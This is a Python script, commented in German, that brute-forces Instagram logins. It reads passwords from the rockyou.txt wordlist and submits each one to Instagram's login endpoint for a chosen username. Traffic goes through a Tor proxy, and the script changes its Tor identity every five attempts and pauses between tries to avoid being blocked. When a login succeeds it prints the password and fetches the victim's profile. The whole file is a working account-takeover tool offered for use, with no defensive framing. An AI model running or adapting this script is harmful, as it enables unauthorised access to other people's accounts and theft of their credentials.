import requests
import json
import time
from proxy.tor_proxy import TorProxy  # Import der TorProxy Klasse

def get_instagram_profile(session, username, proxies=None):
    url = f"https://www.instagram.com/api/v1/users/web_profile_info/?username={username}"
    headers = {
        "accept": "*/*",
        "accept-language": "en-US,en;q=0.9",
        "x-ig-app-id": "936619743392459"
    }
    response = session.get(url, headers=headers, proxies=proxies)
    if response.status_code == 200:
        data = response.json()
        user_info = data.get('data', {}).get('user', {})
        profile = {
            "username": user_info.get('username'),
            "full_name": user_info.get('full_name'),
            "biography": user_info.get('biography'),
            "followers_count": user_info.get('edge_followed_by', {}).get('count'),
            "following_count": user_info.get('edge_follow', {}).get('count'),
            "is_private": user_info.get('is_private'),
            "profile_pic_url": user_info.get('profile_pic_url'),
        }
        return profile
    else:
        print(f"Fehler beim Abrufen des Profils: {response.status_code}")
        print(response.text)
        return None


def instagram_login(session, username, password, proxies=None):
    # Vollständige Browser-Header definieren
    default_headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.9",
        "Connection": "keep-alive",
        "Accept-Encoding": "gzip, deflate, br"
    }

    # 1. Erst Instagram Startseite laden, um Cookies (inkl. csrftoken) zu bekommen
    r = session.get("https://www.instagram.com/", headers=default_headers, proxies=proxies)
    if r.status_code != 200:
        print(f"Fehler beim Laden der Instagram-Startseite: HTTP {r.status_code}")
        return None

    # Prüfe ob csrftoken gesetzt ist
    csrftoken = r.cookies.get("csrftoken")
    if not csrftoken:
        print("Kein csrftoken Cookie nach Startseiten-Anfrage erhalten!")
        return None

    # 2. Login-Seite laden (optional, aber empfohlen)
    r = session.get("https://www.instagram.com/accounts/login/", headers=default_headers, proxies=proxies)
    # CSRF-Token ggf. aktualisieren - Instagram kann den token wechseln
    csrf_token = r.cookies.get("csrftoken") or csrftoken

    if not csrf_token:
        print("Kein CSRF-Token von der Login-Seite erhalten!")
        return None

    headers = {
        **default_headers,
        "X-CSRFToken": csrf_token,
        "Referer": "https://www.instagram.com/accounts/login/",
        "Content-Type": "application/x-www-form-urlencoded",
        "X-Requested-With": "XMLHttpRequest",
        "Origin": "https://www.instagram.com"
    }

    login_data = {
        "username": username,
        "enc_password": f"#PWD_INSTAGRAM_BROWSER:0:&:{password}",
        "queryParams": "{}",
        "optIntoOneTap": "false",
        "stopDeletionNonce": "",
        "trustedDeviceRecords": "{}"
    }

    login_url = "https://www.instagram.com/accounts/login/ajax/"
    login_response = session.post(login_url, data=login_data, headers=headers, proxies=proxies)

    print("HTTP Status Code:", login_response.status_code)
    print("Response Text:", login_response.text[:1000])

    try:
        login_json = login_response.json()
    except json.JSONDecodeError:
        print("Fehler beim JSON-Parsing der Login-Antwort")
        return None

    if login_json.get("authenticated"):
        print("Login erfolgreich!")
        return session
    else:
        print("Login fehlgeschlagen, Details:", login_json)
        return None


def load_passwords(filename):
    try:
        with open(filename, "r", encoding="utf-8", errors="ignore") as f:
            passwords = [line.strip() for line in f if line.strip()]
        print(f"{len(passwords)} Passwörter geladen.")
        return passwords
    except FileNotFoundError:
        print(f"Datei '{filename}' nicht gefunden.")
        return []


def print_current_ip(session, proxies=None):
    try:
        response = session.get("http://httpbin.org/ip", proxies=proxies)
        if response.status_code == 200:
            ip_info = response.json()
            print("Aktuelle IP über Tor Proxy:", ip_info.get("origin", "unbekannt"))
        else:
            print("IP-Abfrage fehlgeschlagen, HTTP Status:", response.status_code)
    except Exception as e:
        print("Fehler bei IP-Abfrage:", e)


if __name__ == "__main__":
    username = input("Instagram Username: ")
    password_file = "rockyou.txt"

    passwords = load_passwords(password_file)
    if not passwords:
        print("Keine Passwörter zum Testen geladen. Beende.")
        exit(1)

    with TorProxy() as proxy:
        session = proxy.session
        if not session:
            print("Konnte keine Proxy-Session erzeugen. Exit.")
            exit(1)

        proxies = None  # Da Tor in Session konfiguriert ist, wird hier keiner extra gebraucht

        print_current_ip(session, proxies)

        for i, pw in enumerate(passwords, start=1):
            print(f"Teste Passwort: {pw}")
            sess = instagram_login(session, username, pw, proxies)
            if sess:
                print(f"Erfolgreiches Login! Passwort: {pw}")
                profile = get_instagram_profile(sess, username, proxies)
                if profile:
                    for k, v in profile.items():
                        print(f"{k}: {v}")
                break
            else:
                if i % 5 == 0:
                    print("Wechsle Tor-IP wegen möglicher Blockierung...")
                    proxy.new_identity()
                    time.sleep(10)  # Warte bis neue IP aktiv
                else:
                    time.sleep(20)  # Pause zwischen Versuchen, um Blockierung zu vermeiden
